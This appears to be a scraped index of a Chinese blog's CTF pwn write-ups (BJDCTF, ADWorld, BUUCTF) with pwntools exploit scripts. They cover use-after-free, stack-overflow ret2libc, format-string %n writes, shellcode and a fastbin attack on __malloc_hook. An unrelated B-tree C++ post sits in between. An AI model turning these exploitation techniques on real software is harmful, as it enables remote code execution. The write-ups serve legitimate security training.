YDSneedGirlfriend本题在删除时没有将指针置空，存在uaf。而girlfriend结构体由一个打印名字的函数和存储名字的char数组构成，我们希望能将该函数指向程序中已经存在的backdoor函数。需要注意64位下最少分配0x20字节，而add(0x20)会分配0x30字节。这确保了在add(0x8)时，先被分配到的是girlfriend1的函数指针，然后是girlfriend0的函数指针。 12345678910111213141516171819def add(size,name='a'): sla(':','1') sla(':',str(size)) sla(':',name)def delete(index): sla(':','2') sla(':',str(index))def show(index): sla(':','3') sla(':',str(index))add(0x20)add(0x20)delete(0)delete(1)add(0x8,p64(elf.sym['backdoor']))show(0) 本题和hitcontraining_uaf类似，不过后者是32位的。 12345678910111213141516171819def add(size,name='a'): sla(':','1') sla(':',str(size)) sla(':',name)def delete(index): sla(':','2') sla(':',str(index))def show(index): sla(':','3') sla(':',str(index))add(0x10)add(0x10)delete(0)delete(1)add(0x8,p32(elf.sym['magic']))show(0)","link":"/post/BJDCTF2019Pwn/"},{"title":"ADWorld 新手区 Pwn","text":"很久没有做 Pwn，对新手区的题目都会感到有些陌生。其中最喜欢的题目是string。 level2基本的栈溢出到system地址随后传入/bin/sh地址，后者可通过 ROPgadget 搜索到。 1234ru('Input:\\n')binsh = 0x804a024payload = flat('a'*(0x88+4),elf.plt['system'],'a'*4, binsh)sl(payload) guess_num12345678910111213141516171819202122232425262728293031323334353637383940__int64 __fastcall main(__int64 a1, char **a2, char **a3){ int v4; // [rsp+4h] [rbp-3Ch] int i; // [rsp+8h] [rbp-38h] int v6; // [rsp+Ch] [rbp-34h] char v7; // [rsp+10h] [rbp-30h] unsigned int seed[2]; // [rsp+30h] [rbp-10h] unsigned __int64 v9; // [rsp+38h] [rbp-8h] v9 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); v4 = 0; v6 = 0; *(_QWORD *)seed = sub_BB0(); puts(&quot;-------------------------------&quot;); puts(&quot;Welcome to a guess number game!&quot;); puts(&quot;-------------------------------&quot;); puts(&quot;Please let me know your name!&quot;); printf(&quot;Your name:&quot;, 0LL); gets(&amp;v7); srand(seed[0]); for ( i = 0; i &lt;= 9; ++i ) { v6 = rand() % 6 + 1; printf(&quot;-------------Turn:%d-------------\\n&quot;, (unsigned int)(i + 1)); printf(&quot;Please input your guess number:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v4); puts(&quot;---------------------------------&quot;); if ( v4 != v6 ) { puts(&quot;GG!&quot;); exit(1); } puts(&quot;Success!&quot;); } sub_C3E(); return 0LL;} 使用了srand生成随机种子，但是参数seed可以被v7覆盖，因此我们只需要控制seed[0]即可预测产生的随机数从而进入sub_C3E后门函数。 123456789ru('name:')payload = flat('a'*0x20, 0)sl(payload)from ctypes import *libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)libc.srand(0)for i in range(10): sla('number:', libc.rand()%6+1) int_overflow本题只能login，并输入用户名密码，随后进入check_passwd函数验证： 1234567891011121314151617181920char *__cdecl check_passwd(char *s){ char *result; // eax char dest; // [esp+4h] [ebp-14h] unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 = strlen(s); if ( v3 &lt;= 3u || v3 &gt; 8u ) { puts(&quot;Invalid Password&quot;); result = (char *)fflush(stdout); } else { puts(&quot;Success&quot;); fflush(stdout); result = strcpy(&amp;dest, s); } return result;} 注意到这里我们希望进入else语句，将输入的s复制到dest所在地址处造成栈溢出。但是这要求s的长度大于 3 且小于 8，这个长度太短了。因此结合题名考虑整数溢出：这里的v3是无符号的 8 位整数，那么当字符串长度实际上只需要模 255 的结果大于 3 小于 8 即可。最后返回到后门函数。 1234567ru('choice:')sl('1')ru('username:\\n')sl('aaa')ru('passwd:\\n')payload = flat('a'*(0x14+4),elf.sym['what_is_this'])sl(payload.ljust(260, 'a')) cgpwn2本题提供了一个 bss 段的可写的name字符串数组，显然就是要我们向其中写入/bin/sh，然后通过溢出调用system(&quot;/bin/sh&quot;)。 12345ru('name\\n')sl('/bin/sh')ru('here:\\n')payload = flat('a'*(0x26+4),elf.plt['system'],'a'*4,0x804a080)sl(payload) when_did_you_born这题要求输入的生日年份v5不能等于 1926，但是之后又要求v5等于 1926，两者之间存在一个get(&amp;v4)的操作，很容易想到通过溢出v4来修改v5的值。 12345ru('Birth?\\n')sl('1900')ru('Name?\\n')payload = flat('a'*0x8,1926)sl(payload) hello_pwn直接计算得到偏移量为 4 并溢出为指定值即可，没有难度。 123ru('bof\\n')payload = flat('a'*4,0x6e756161)sl(payload) level3基础的 ret2libc，注意加载题目给定的 libc。 12345678910111213ru('Input:\\n')payload = flat('a'*(0x88+4),elf.plt['write'],elf.sym['main'],1,elf.got['write'],0x4)sl(payload)write = uu32(r(4))leak('write',write)base = write - libc.sym['write']system = base + libc.sym['system']binsh = base + libc.search('/bin/sh').next()ru('Input:\\n')payload = flat('a'*(0x88+4),system,'a'*4,binsh)sl(payload) string跟着剧情走一遍大概可以知道可以选的选项以及格式化字符串漏洞的存在。查看代码可以验证漏洞，关键是如何利用。 我们在角色死亡的函数发现了一个分支： 1234567891011121314151617181920unsigned __int64 __fastcall sub_400CA6(_DWORD *a1){ void *v1; // rsi unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); puts(&quot;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!&quot;); puts(&quot;Dragon say: HaHa! you were supposed to have a normal&quot;); puts(&quot;RPG game, but I have changed it! you have no weapon and &quot;); puts(&quot;skill! you could not defeat me !&quot;); puts(&quot;That's sound terrible! you meet final boss!but you level is ONE!&quot;); if ( *a1 == a1[1] ) { puts(&quot;Wizard: I will help you! USE YOU SPELL&quot;); v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL); read(0, v1, 0x100uLL); ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1); } return __readfsqword(0x28u) ^ v3;} 这里显然是需要用到巫师的法术，也就是说和开头的 secret 有关。当*a1 == a1[1]时会触发并从用户输入读取v1，随后直接当作代码执行，那么这里应该是需要 shellcode。而a1来自于main函数中的v4： 123456789101112131415161718192021__int64 __fastcall main(__int64 a1, char **a2, char **a3){ _DWORD *v3; // rax __int64 v4; // ST18_8 setbuf(stdout, 0LL); alarm(0x3Cu); sub_400996(60LL, 0LL); v3 = malloc(8uLL); v4 = (__int64)v3; *v3 = 68; v3[1] = 85; puts(&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;); puts(&quot;we will tell you two secret ...&quot;); printf(&quot;secret[0] is %x\\n&quot;, v4, a2); printf(&quot;secret[1] is %x\\n&quot;, v4 + 4); puts(&quot;do not tell anyone &quot;); sub_400D72(v4); puts(&quot;The End.....Really?&quot;); return 0LL;} 而v4实际上就是v3，那么这里将v3[0]改为85即可。而巫师给我们的secret[0]恰好就是我们需要的v3[0]的地址，我们把这个地址输入到Give me an address后，然后在wish处输入格式化字符串。首先由于需要%n写入，我们先输出 85 个字符即%85c，随后要测出偏移，可以通过aaaa%p.%p.这种形式的格式化字符串测出偏移为 7。因此最终构造的格式化字符串为%85c%7$n。 123456789ru('secret[0] is ')addr = int(ru('\\n'), 16)sla('name be:\\n', 'merc')sla('up?:\\n', 'east')sla('(0)?:\\n', '1')sla(&quot;address'\\n&quot;, str(addr))sla('is:\\n', '%85c%7$n')ru('SPELL\\n')sl(asm(shellcraft.sh())) getshellnc 直连。 CGfsb同样是格式化字符串漏洞，相比string那题要简单不少，只需要让全局变量pwnme为 8，地址可直接 IDA 得到，偏移量同样通过aaaa%p.%p.测出。为此构造字符串pwnme地址 + %4c%10$n，%4c是为了让已打印字符凑足 8 个。 123pwnme = 0x804a068sla('name:\\n', 'merc')sla('please:\\n', p32(pwnme) + '%4c%10$n')","link":"/post/ADWorldPwn/"},{"title":"B 树","text":"我也是心里有B树的人了。 数据结构课上和AVL树一起让我觉得略有难度的东西。说起来，B树又叫B-树，然而中间并不是减号而是连接符；同时，数据库索引使用的B+树中间的+号又真的是加号。。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330#include &lt;iostream&gt;using namespace std;template &lt;class Record, int order&gt;struct B_node{ int cnt; Record data[order-1]; B_node&lt;Record, order&gt; *branch[order]; B_node() {cnt = 0;}};enum Error_code {not_present, duplicate_error, overflow, success};template&lt;class Record,int order&gt;class B_tree{public: B_tree() {root = nullptr;} Error_code search_tree(Record &amp;target) { return recursive_search_tree(root, target); } Error_code insert(const Record &amp;new_entry); Error_code remove(const Record &amp;target);private: B_node&lt;Record, order&gt; *root; Error_code recursive_search_tree(B_node&lt;Record, order&gt; *current, Record &amp;target); Error_code search_node(B_node&lt;Record, order&gt; *current, const Record &amp;target, int &amp;pos); Error_code push_down(B_node&lt;Record, order&gt; *current, const Record &amp;new_entry, Record &amp;median, B_node&lt;Record, order&gt; * &amp;right_branch); void push_in(B_node&lt;Record, order&gt; *current, const Record &amp;entry, B_node&lt;Record, order&gt; *right_branch, int pos); void split_node(B_node&lt;Record, order&gt; *current, const Record &amp;extra_entry, B_node&lt;Record, order&gt; *extra_branch, int pos, B_node&lt;Record, order&gt; * &amp;right_half, Record &amp;median); Error_code recursive_remove(B_node&lt;Record, order&gt; *current, const Record &amp;target); void remove_data(B_node&lt;Record, order&gt; *current, int pos) { for (int i = pos; i &lt; current-&gt;cnt-1; ++i) current-&gt;data[i] = current-&gt;data[i+1]; --current-&gt;cnt; } void copy_in_predecessor(B_node&lt;Record, order&gt; *current, int pos) { B_node&lt;Record, order&gt; *leaf = current-&gt;branch[pos]; while (leaf-&gt;branch[leaf-&gt;cnt]) leaf = leaf-&gt;branch[leaf-&gt;cnt]; current-&gt;data[pos] = leaf-&gt;data[leaf-&gt;cnt-1]; } void restore(B_node&lt;Record, order&gt; *current, int pos); void move_left(B_node&lt;Record, order&gt; *current, int pos); void move_right(B_node&lt;Record, order&gt; *current, int pos); void combine(B_node&lt;Record, order&gt; *current, int pos);};template&lt;class Record, int order&gt;Error_code B_tree&lt;Record, order&gt;::recursive_search_tree(B_node&lt;Record, order&gt; *current, Record &amp;target){ Error_code result = not_present; int pos; if (current) { result = search_node(current, target, pos); if (result == not_present) result = recursive_search_tree(current-&gt;branch[pos], target); else target = current-&gt;data[pos]; } return result;}template&lt;class Record, int order&gt;Error_code B_tree&lt;Record, order&gt;::search_node(B_node&lt;Record, order&gt; *current, const Record &amp;target, int &amp;pos){ pos = 0; while (pos &lt; current-&gt;cnt &amp;&amp; target &gt; current-&gt;data[pos]) ++pos; if (pos &lt; current-&gt;cnt &amp;&amp; target == current-&gt;data[pos]) return success; else return not_present;}template&lt;class Record, int order&gt;Error_code B_tree&lt;Record, order&gt;::insert(const Record &amp;new_entry){ Record median; B_node&lt;Record, order&gt; *right_branch, *new_root; Error_code result = push_down(root, new_entry, median, right_branch); if (result == overflow) { new_root = new B_node&lt;Record, order&gt;; new_root-&gt;cnt = 1; new_root-&gt;data[0] = median; new_root-&gt;branch[0] = root; new_root-&gt;branch[1] = right_branch; root = new_root; result = success; } return result;}template&lt;class Record, int order&gt;Error_code B_tree&lt;Record, order&gt;::push_down(B_node&lt;Record, order&gt; *current, const Record &amp;new_entry, Record &amp;median, B_node&lt;Record, order&gt; * &amp;right_branch){ Error_code result; int pos; if (!current) { median = new_entry; right_branch = nullptr; result = overflow; } else { if (search_node(current, new_entry, pos) == success) result = duplicate_error; else { Record extra_entry; B_node&lt;Record, order&gt; *extra_branch; result = push_down(current-&gt;branch[pos], new_entry, extra_entry, extra_branch); if (result == overflow) { if (current-&gt;cnt &lt; order-1) { result = success; push_in(current, extra_entry, extra_branch, pos); }else split_node(current, extra_entry, extra_branch, pos, right_branch, median); } } } return result;}template&lt;class Record, int order&gt;void B_tree&lt;Record, order&gt;::push_in(B_node&lt;Record, order&gt; *current, const Record &amp;entry, B_node&lt;Record, order&gt; *right_branch, int pos){ for (int i = current-&gt;cnt; i &gt; pos; --i) { current-&gt;data[i] = current-&gt;data[i-1]; current-&gt;branch[i+1] = current-&gt;branch[i]; } current-&gt;data[pos] = entry; current-&gt;branch[pos+1] = right_branch; ++current-&gt;cnt;}template&lt;class Record, int order&gt;void B_tree&lt;Record, order&gt;::split_node(B_node&lt;Record, order&gt; *current, const Record &amp;extra_entry, B_node&lt;Record, order&gt; *extra_branch, int pos, B_node&lt;Record, order&gt; * &amp;right_half, Record &amp;median){ right_half = new B_node&lt;Record, order&gt;; int mid = order&gt;&gt;1; if (pos &lt;= mid) { for (int i = mid; i &lt; order-1; ++i) { right_half-&gt;data[i-mid] = current-&gt;data[i]; right_half-&gt;branch[i+1-mid] = current-&gt;branch[i+1]; } current-&gt;cnt = mid; right_half-&gt;cnt = order - mid - 1; push_in(current, extra_entry, extra_branch, pos); } else { ++mid; for (int i = mid; i &lt; order-1; ++i) { right_half-&gt;data[i-mid] = current-&gt;data[i]; right_half-&gt;branch[i+1-mid] = current-&gt;branch[i+1]; } current-&gt;cnt = mid; right_half-&gt;cnt = order - 1 - mid; push_in(right_half, extra_entry, extra_branch, pos-mid); } median = current-&gt;data[current-&gt;cnt-1]; right_half-&gt;branch[0] = current-&gt;branch[current-&gt;cnt]; --current-&gt;cnt;}template &lt;class Record, int order&gt;Error_code B_tree&lt;Record, order&gt;::remove(const Record &amp;target){ Error_code result; result = recursive_remove(root, target); if (root &amp;&amp; !root-&gt;cnt) { B_node&lt;Record, order&gt; *old_root = root; root = root-&gt;branch[0]; delete old_root; } return result;}template &lt;class Record, int order&gt;Error_code B_tree&lt;Record, order&gt;::recursive_remove(B_node&lt;Record, order&gt; *current, const Record &amp;target){ Error_code result; int pos; if (!current) result = not_present; else { if (search_node(current, target, pos) == success) { result = success; if (current-&gt;branch[pos]) { copy_in_predecessor(current, pos); recursive_remove(current-&gt;branch[pos], current-&gt;data[pos]); } else remove_data(current, pos); }else result = recursive_remove(current-&gt;branch[pos], target); if (current-&gt;branch[pos]) if (current-&gt;branch[pos]-&gt;cnt &lt; ((order-1)&gt;&gt;1)) restore(current, pos); } return result;}template &lt;class Record, int order&gt;void B_tree&lt;Record, order&gt;::restore(B_node&lt;Record, order&gt; *current, int pos){ if (pos == current-&gt;cnt) if (current-&gt;branch[pos-1]-&gt;cnt &gt; ((order-1)&gt;&gt;1)) move_right(current, pos-1); else combine(current, pos); else if (!pos) if (current-&gt;branch[1]-&gt;cnt &gt; ((order-1)&gt;&gt;1)) move_left(current, 1); else combine(current, 1); else if (current-&gt;branch[pos-1]-&gt;cnt &gt; ((order-1)&gt;&gt;1)) move_right(current, pos-1); else if (current-&gt;branch[pos+1]-&gt;cnt &gt; ((order-1)&gt;&gt;1)) move_left(current, pos+1); else combine(current, pos);}template &lt;class Record, int order&gt;void B_tree&lt;Record, order&gt;::move_left(B_node&lt;Record, order&gt; *current, int pos){ B_node&lt;Record, order&gt; *left_branch = current-&gt;branch[pos-1], *right_branch = current-&gt;branch[pos]; left_branch-&gt;data[left_branch-&gt;cnt] = current-&gt;data[pos-1]; left_branch-&gt;branch[++left_branch-&gt;cnt] = right_branch-&gt;branch[0]; current-&gt;data[pos-1] = right_branch-&gt;data[0]; --right_branch-&gt;cnt; for (int i = 0; i &lt; right_branch-&gt;cnt; ++i) { right_branch-&gt;data[i] = right_branch-&gt;data[i+1]; right_branch-&gt;branch[i] = right_branch-&gt;branch[i+1]; } right_branch-&gt;branch[right_branch-&gt;cnt] = right_branch-&gt;branch[right_branch-&gt;cnt+1];}template &lt;class Record, int order&gt;void B_tree&lt;Record, order&gt;::move_right(B_node&lt;Record, order&gt; *current, int pos){ B_node&lt;Record, order&gt; *right_branch = current-&gt;branch[pos+1], *left_branch = current-&gt;branch[pos]; right_branch-&gt;branch[right_branch-&gt;cnt+1] = right_branch-&gt;branch[right_branch-&gt;cnt]; for (int i = right_branch-&gt;cnt; i &gt; 0; --i) { right_branch-&gt;data[i] = right_branch-&gt;data[i-1]; right_branch-&gt;branch[i] = right_branch-&gt;branch[i-1]; } ++right_branch-&gt;cnt; right_branch-&gt;data[0] = current-&gt;data[pos]; right_branch-&gt;branch[0] = left_branch-&gt;branch[left_branch-&gt;cnt--]; current-&gt;data[pos] = left_branch-&gt;data[left_branch-&gt;cnt];}template &lt;class Record, int order&gt;void B_tree&lt;Record, order&gt;::combine(B_node&lt;Record, order&gt; *current, int pos){ int i; B_node&lt;Record, order&gt; *left_branch = current-&gt;branch[pos-1], *right_branch = current-&gt;branch[pos]; left_branch-&gt;data[left_branch-&gt;cnt] = current-&gt;data[pos-1]; left_branch-&gt;branch[++left_branch-&gt;cnt] = right_branch-&gt;branch[0]; for (i = 0; i &lt; right_branch-&gt;cnt; ++i) { left_branch-&gt;data[left_branch-&gt;cnt] = right_branch-&gt;data[i]; left_branch-&gt;branch[++left_branch-&gt;cnt] = right_branch-&gt;branch[i+1]; } --current-&gt;cnt; for (i = pos-1; i &lt; current-&gt;cnt; ++i) { current-&gt;data[i] = current-&gt;data[i+1]; current-&gt;branch[i+1] = current-&gt;branch[i+2]; } delete right_branch;}int main(){ B_tree&lt;char, 5&gt; mybtree; mybtree.insert('a'); mybtree.insert('g'); mybtree.insert('f'); mybtree.insert('b'); mybtree.insert('k'); mybtree.insert('d'); mybtree.insert('h'); mybtree.insert('m'); mybtree.insert('j'); mybtree.insert('e'); mybtree.insert('s'); mybtree.insert('i'); mybtree.insert('r'); mybtree.insert('x'); mybtree.insert('c'); mybtree.insert('l'); mybtree.insert('n'); mybtree.insert('t'); mybtree.insert('u'); mybtree.insert('p'); char target = 'k'; cout &lt;&lt; mybtree.search_tree(target); mybtree.remove('k'); cout &lt;&lt; mybtree.search_tree(target); cin.get(); return 0;}","link":"/post/BTree/"},{"title":"BUUCTF Pwn 练习","text":"从今天起，我也是Pwn🐕了。 test_your_ncnc 直接连，cat flag。 rip栈溢出，可直接覆盖返回地址，注意 64 位： 12payload = 'a'*(0xf+8) + p64(elf.symbols['fun'])s(payload) warmup_csaw_2016和上题其实一样，程序中存在后门，直接返回过去。 12payload = 'a'*(0x40+8) + p64(0x40060d)s(payload) pwn1_sctf_2016直接运行几次或者源码审计可以发现是将输入的I替换为you，其余的其实和上面一样： 12payload = 'I'*(0x3c // 3)+'a'*4+p32(elf.symbols['get_flag'])sl(payload) ciscn_2019_c_1开启了 NX 保护，并且有未限制长度的gets，基本上可以确定是 ROP 栈溢出。IDA 搜一下 string，可以发现有 libc 可以用，考虑 ret2libc。 1234567891011121314151617pop_rdi = 0x400c83def send(payload): ru('!\\n') sl('1') ru('ed\\n') sl(payload)payload = flat('a'*0x58,pop_rdi,elf.got['__libc_start_main'],elf.plt['puts'],elf.sym['main'])send(payload)ru('@\\n')leak = uu64(r(6))system,binsh = ret2libc(leak, '__libc_start_main')payload = flat('a'*0x58,pop_rdi,binsh,system)send(payload) ciscn_2019_n_1依然是最简单的无保护gets并且程序中有system(&quot;cat /flag&quot;)，找到后者地址返回过去即可。 12345678cat_flag = 0x4006bedef send(payload): ru('number.\\n') sl(payload)payload = flat('a'*0x38, cat_flag)send(payload) ciscn_2019_en_2和上上题一样。 [OGeek2019]babyrop1234567891011121314int __cdecl main(){ int buf; // [esp+4h] [ebp-14h] char v2; // [esp+Bh] [ebp-Dh] int fd; // [esp+Ch] [ebp-Ch] sub_80486BB(); fd = open(&quot;/dev/urandom&quot;, 0); if ( fd &gt; 0 ) read(fd, &amp;buf, 4u); v2 = sub_804871F(buf); sub_80487D0(v2); return 0;} main中sub_80486BB用于初始化，然后将一个随机数传入sub_804871F： 12345678910111213141516171819int __cdecl sub_804871F(int a1){ size_t v1; // eax char s; // [esp+Ch] [ebp-4Ch] char buf[7]; // [esp+2Ch] [ebp-2Ch] unsigned __int8 v5; // [esp+33h] [ebp-25h] ssize_t v6; // [esp+4Ch] [ebp-Ch] memset(&amp;s, 0, 0x20u); memset(buf, 0, 0x20u); sprintf(&amp;s, &quot;%ld&quot;, a1); v6 = read(0, buf, 0x20u); buf[v6 - 1] = 0; v1 = strlen(buf); if ( strncmp(buf, &amp;s, v1) ) exit(0); write(1, &quot;Correct\\n&quot;, 8u); return v5;} 这里的a1就是传入的随机数，然后要求我们的输入和随机数经过strncmp比较后完全相同，我们可以输入\\x00使得strlen函数返回 0，从而使得strncmp函数只比较 0 个字节，那么就能绕过这里的exit(0)，并返回v5。注意到这里的返回值v5在ebp-0x25，距离我们能控制的位于ebp-0x2c的变量buf相差0x7，小于这里read的长度限制0x20，因此可以通过栈溢出控制v5的值，从而控制main中的v2。 随后，v2会被传入sub_80487D0: 1234567891011ssize_t __cdecl sub_80487D0(char a1){ ssize_t result; // eax char buf; // [esp+11h] [ebp-E7h] if ( a1 == 127 ) result = read(0, &amp;buf, 0xC8u); else result = read(0, &amp;buf, a1); return result;} a1就是我们可以控制的v2，也就是说这里可以向buf写入的数据长度也是我们能控制的，那么我们希望它尽可能大，也就是等于0xff。那么在上一个函数中我们就需要令v5为0xff，结合上面的绕过，可以输入'\\x00' + 6*'a' + '\\xff'来达到这个目的。最后ret2libc即可。 12345678910111213141516def send1(): payload = flat('\\x00','a'*6,'\\xff') sl(payload) ru('Correct\\n')send1()main = 0x8048825payload = flat('a'*(0xe7+4),elf.plt['write'],main,1,elf.got['__libc_start_main'],4)sl(payload)leak = u32(r(4))system,binsh = ret2libc(leak, '__libc_start_main')send1()payload = flat('a'*(0xe7+4),system,'a'*4,binsh)p.sendline(payload) babyheap_0ctf_2017123456===== Baby Heap in 2017 =====1. Allocate2. Fill3. Free4. Dump5. Exit 分配内存使用了calloc，每次分配会先清空一下这块内存，大小限制是 4096B。填充时直接读取用户输入，没有检查长度，因此可以堆溢出。除了 canary 外保护全开，因此考虑泄露 libc。如何泄露？ 当只有一个 small bin/large bin 被释放时，其fd与bk指向main_arena中的地址，而后者是 libc 的一个全局变量，因此可以通过它泄露出 libc 基址。 首先分配 4 个 fast chunk 和 1 个 small chunk（不妨分别称为a,b,c,d,e），然后释放b，它将被加入 fast bin 顶部。此时再释放c，那么c也会加入 fast bin 顶部，并且它的fd指向b。此时有：freelist-&gt;c-&gt;b。 12345for i in range(4): alloc(0x10) # a0,b1,c2,d3alloc(0x80) # e4free(1) # bfree(2) # c 这样就可以进行 fastbin attack。利用Fill堆溢出修改c的fd为e的地址（我们需要从未被释放的a开始填充，所以刚才不是从a开始释放），随后第一次Allocate拿到c，第二次Allocate就能拿到e。 123# c-&gt;fd = epayload = flat([0,0,0,0x21,0,0,0,0x21,'\\x80'])fill(0, payload) 注意这里 payload 的前三个0用于填充a中0x10字节的用户数据和b中0x8字节的prev_size字段，后面同理。0x21是a/b/c/d的chunk_size，0x80是e的地址低 8 位，都可以通过 gdb 调试得到。 注：0x21低位的1表示PREV_INUSE，这和 fast bin 中 chunk 的 P 位不变是一致的。 然而这里存在一个安全检查： 12345678910#define fastbin_index(sz) \\ ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)){ errstr = &quot;malloc(): memory corruption (fast)&quot;;errout: malloc_printerr (check_action, errstr, chunk2mem (victim), av); return NULL;} 检查我们拿到的 chunk 的大小是否在对应索引的 fast bin 范围内。所以我们还需要修改e的chunk_size字段，方法同样是堆溢出。 123# e-&gt;chunk_size = 0x21payload = flat([0,0,0,0x21])fill(3, payload) 这里通过d溢出到e的chunk_size并覆盖上了0x21，gdb 调试得到其索引为2。 修改完成后才可以进行两次alloc(0x10)从而拿到e。拿到e后再释放掉它就可以获得其fd与bk，但这里有两个问题： 前面对其chunk_size的修改会导致释放时e进入 fast bin，拿不到fd和bk。 e被释放后与 top chunk 相邻，必定会被合并。 fd和bk到底指向哪里？ 解答： 把e的chunk_size恢复即可。 释放e前再多申请一个 small chunk 使得e不与 top chunk 相邻。 e被释放后进入 unsorted bin，所以其fd与bk都指向 unsorted bin 的链表头，注意其地址到 libc 基址的偏移是固定的0x3c4b78。 1234567# e-&gt;chunk_size = 0x91payload = flat([0,0,0,0x91])fill(3, payload)alloc(0x80) # f5free(4) # e, e-&gt;fd = unsorted_headbase = u64(dump(2)[:8])-0x3c4b78 最后的dump(2)就是打印索引为2的 chunk，也就是e，从而得到e的fd和bk。 之后，再次使用 fast bin attack 将 libc 中函数，例如__malloc_hook放入 fast bin，然后用malloc返回给我们，就可以实现类似 GOT 劫持的效果。__malloc_hook只要非空，就会在malloc时被调用，我们让它指向one_gadget找到的一个 gadget 即可，比如可以用距离 libc 基址 0x4526a 的 gadget。 但是同样的，我们需要绕过上面的安全检查。幸运的是，该检查对于对齐没有任何要求。通过 gdb 调试我们发现在__malloc_hook附近的_IO_wide_data_0+304位置其高位字节为7f而低位字节含有连续的00，因此可以通过增加一些偏移获得0x7f这个数值作为chunk_size，恰好能通过检查。 如下： 12345pwndbg&gt; x/32xg (long long)(&amp;main_arena)-0x400x7f16d95deae0 &lt;_IO_wide_data_0+288&gt;: 0x0000000000000000 0x00000000000000000x7f16d95deaf0 &lt;_IO_wide_data_0+304&gt;: 0x00007f16d95dd260 0x00000000000000000x7f16d95deb00 &lt;__memalign_hook&gt;: 0x00007f16d929fe20 0x00007f16d929fa000x7f16d95deb10 &lt;__malloc_hook&gt;: 0x0000000000000000 0x0000000000000000 我们加 13 字节偏移（循环右移），成功伪造chunk_size： 12345pwndbg&gt; x/32xg (long long)(&amp;main_arena)-0x40+0xd0x7f16d95deaed &lt;_IO_wide_data_0+301&gt;: 0x16d95dd260000000 0x000000000000007f0x7f16d95deafd: 0x16d929fe20000000 0x16d929fa0000007f0x7f16d95deb0d &lt;__realloc_hook+5&gt;: 0x000000000000007f 0x00000000000000000x7f16d95deb1d: 0x0000000000000000 0x0000000000000000 0x7f对应的malloc请求大小大约是0x60。现在，freelist 顶部是e，于是alloc(0x60)就会分配总大小为0x71、起点与e相同、且索引为4的 chunkg，这时再free掉g就会使得g位于 freelist 顶部。 12alloc(0x60) # g4free(4) # g 接下来修改索引为2的 chunk 的fd（实际就是为了修改e或者说g的fd）指向_IO_wide_data_0+301地址，然后第一次Allocate得到g位于索引5，第二次Allocate得到指向_IO_wide_data_0+301的指针，位于索引6。 123456# g-&gt;fd = _IO()payload = p64(base+0x3c4aed)fill(2, payload)alloc(0x60) # g5alloc(0x60) # _IO()6 而由上面的 gdb 分析可知得到的指针位于0xaed，__malloc_hook位于0xb10（PIE 下低 12 位固定），相差0x13。因此填充0x13字节的 padding 后再放上 getshell 的 gadget 地址即可。 123# _IO() + 13 == __malloc_hook(), one_gadgetpayload = flat(['\\x00'*0x13, base+0x4526a])fill(6, payload) 最后不要忘记再申请一次任意大小内存以调用__malloc_hook。完整 exp，注意最后一次 alloc 返回得有点慢，recvuntil最好加一个timeout： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768def alloc(size): sl('1') sla(': ', str(size)) ru(': ', timeout=1)def fill(idx, data): sl('2') sla(': ', str(idx)) sla(': ', str(len(data))) sa(': ', data) ru(': ')def free(idx): sl('3') sla(': ', str(idx)) ru(': ')def dump(idx): sl('4') sla(': ', str(idx)) ru(': \\n') data = p.ru('\\n') ru(': ') return datafor i in range(4): alloc(0x10) # a0,b1,c2,d3alloc(0x80) # e4free(1) # bfree(2) # c# c-&gt;fd = epayload = flat(0,0,0,0x21,0,0,0,0x21,'\\x80')fill(0, payload)# e-&gt;chunk_size = 0x21payload = flat(0,0,0,0x21)fill(3, payload)alloc(0x10) # c1alloc(0x10) # e2# e-&gt;chunk_size = 0x91payload = flat(0,0,0,0x91)fill(3, payload)alloc(0x80) # f5free(4) # e, e-&gt;fd = unsorted_headbase = u64(dump(2)[:8])-0x3c4b78leak('libc_base',base)alloc(0x60) # g4free(4) # g# g-&gt;fd = _IO()payload = p64(base+0x3c4aed)fill(2, payload)alloc(0x60) # g5alloc(0x60) # _IO()6# _IO() + 0x13 == __malloc_hook(), one_gadgetpayload = flat('\\x00'*0x13,p64(base+0x4526a))fill(6, payload)# malloc() -&gt; __malloc_hook()alloc(1) get_started_3dsctf_2016本地运行脚本： 12345get_flag = 0x80489a0payload = flat('a'*0x38,get_flag,'a'*4,0x308cd64f,0x195719d1)sl(payload)print r() 本来这样是可以直接读取 flag 的，但是远程不行。因此远程运行时换了一种更具难度的方法，就是调用mprotect修改bss段权限使得其可执行，随后写入 shellcode。 需要注意mprotect第二个参数要求页对齐，第三个参数为7表示rwx。修改完成后从标准输入读入 shellcode，写入bss_base后返回到bss_base处执行。 1234567pop3 = 0x80483b8got_base = 0x80eb000bss_base = elf.bss()payload = flat('a'*0x38,elf.sym['mprotect'],pop3,got_base,0x1000,7,elf.sym['read'],pop3,0,bss_base,0x200,bss_base)sl(payload)sleep(1)sl(asm(shellcraft.sh())) not_the_same_3dsctf_2016和上面 get_started 做法一样。我怀疑 BUU 上一题在服务器上放错了二进制文件，也放了这一题的，所以第一个脚本才会无效。 [第五空间 2019 决赛]PWN5长度限制无法栈溢出，但是存在明显的格式化字符串漏洞。通过aaaa %08x %08x ...可以判断偏移为 10。 然后利用%10$n修改0x804c044地址（IDA 得到）处的值即可，最后输入passwd需要与已成功输出的字符数相等。当然，也可以直接修改atoi的 GOT 地址为system的 PLT 地址。 12sla(':', p32(0x804c044) + 